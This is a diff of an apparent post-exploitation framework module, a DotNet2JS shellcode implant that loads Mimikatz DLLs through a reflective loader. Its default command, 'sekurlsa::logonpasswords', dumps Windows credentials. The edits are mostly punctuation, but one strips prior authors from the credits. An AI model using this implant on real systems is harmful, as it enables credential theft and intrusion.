@@ -97,34 +97,34 @@ class DotNet2JSJob(core.job.Job):
 class DotNet2JSImplant(core.implant.Implant):
 
     NAME = "Shellcode via DotNet2JS"
-    DESCRIPTION = "Executes arbitrary shellcode using the DotNet2JS technique"
-    AUTHORS = ["entynetproject", "Aleph-Naught-" "gentilwiki", "tiraniddo"]
+    DESCRIPTION = "Executes arbitrary shellcode using the DotNet2JS technique."
+    AUTHORS = ["Entynetproject"]
     STATE = "implant/inject/mimikatz_dotnet2js"
 
     def load(self):
-        self.options.register("DIRECTORY", "%TEMP%", "writeable directory on session", required=False)
+        self.options.register("DIRECTORY", "%TEMP%", "Writeable directory on session.", required=False)
 
         self.options.register("MIMICMD", "sekurlsa::logonpasswords", "What Mimikatz command to run?", required=True)
 
-        self.options.register("ARCH", "auto", "Architecture of the target computer (auto, 64, 32)", advanced=True, enum=['auto', '64', '32'])
+        self.options.register("ARCH", "auto", "Architecture of the target computer (auto, 64, 32).", advanced=True, enum=['auto', '64', '32'])
 
-        self.options.register("SHIMX86DLL", "data/bin/mimishim.dll", "relative path to mimishim.dll", required=True, advanced=True)
-        self.options.register("SHIMX64DLL", "data/bin/mimishim.x64.dll", "relative path to mimishim.x64.dll", required=True, advanced=True)
-        self.options.register("MIMIX86DLL", "data/bin/powerkatz32.dll", "relative path to powerkatz32.dll", required=True, advanced=True)
-        self.options.register("MIMIX64DLL", "data/bin/powerkatz64.dll", "relative path to powerkatz64.dll", required=True, advanced=True)
+        self.options.register("SHIMX86DLL", "data/bin/mimishim.dll", "Relative path to mimishim.dll.", required=True, advanced=True)
+        self.options.register("SHIMX64DLL", "data/bin/mimishim.x64.dll", "Relative path to mimishim.x64.dll.", required=True, advanced=True)
+        self.options.register("MIMIX86DLL", "data/bin/powerkatz32.dll", "Relative path to powerkatz32.dll.", required=True, advanced=True)
+        self.options.register("MIMIX64DLL", "data/bin/powerkatz64.dll", "Relative path to powerkatz64.dll.", required=True, advanced=True)
 
-        self.options.register("UUIDHEADER", "ETag", "HTTP header for UUID", advanced=True)
+        self.options.register("UUIDHEADER", "ETag", "HTTP header for UUID.", advanced=True)
 
         import uuid
-        self.options.register("SHIMX64UUID", uuid.uuid4().hex, "UUID", hidden=True)
-        self.options.register("MIMIX64UUID", uuid.uuid4().hex, "UUID", hidden=True)
-        self.options.register("MIMIX86UUID", uuid.uuid4().hex, "UUID", hidden=True)
+        self.options.register("SHIMX64UUID", uuid.uuid4().hex, "UUID.", hidden=True)
+        self.options.register("MIMIX64UUID", uuid.uuid4().hex, "UUID.", hidden=True)
+        self.options.register("MIMIX86UUID", uuid.uuid4().hex, "UUID.", hidden=True)
 
         self.options.register("SHIMX86B64", self.dllb64(self.options.get("SHIMX86DLL")), "calculated bytes for arr_DLL", hidden=True)
         self.options.register("SHIMX64B64", self.dllb64(self.options.get("SHIMX64DLL")), "calculated bytes for arr_DLL", hidden=True)
 
-        self.options.register("SHIMX86OFFSET", "6202", "Offset to the reflective loader", advanced = True)
-        self.options.register("SHIMX64OFFSET", "7620", "Offset to the reflective loader", advanced = True)
+        self.options.register("SHIMX86OFFSET", "6202", "Offset to the reflective loader.", advanced = True)
+        self.options.register("SHIMX64OFFSET", "7620", "Offset to the reflective loader.", advanced = True)
 
         # self.options.register("SHIMB64", "", "calculated bytes for arr_DLL", advanced = True)
         # self.options.register("SHIMOFFSET", "", "Offset to the reflective loader", advanced = True)
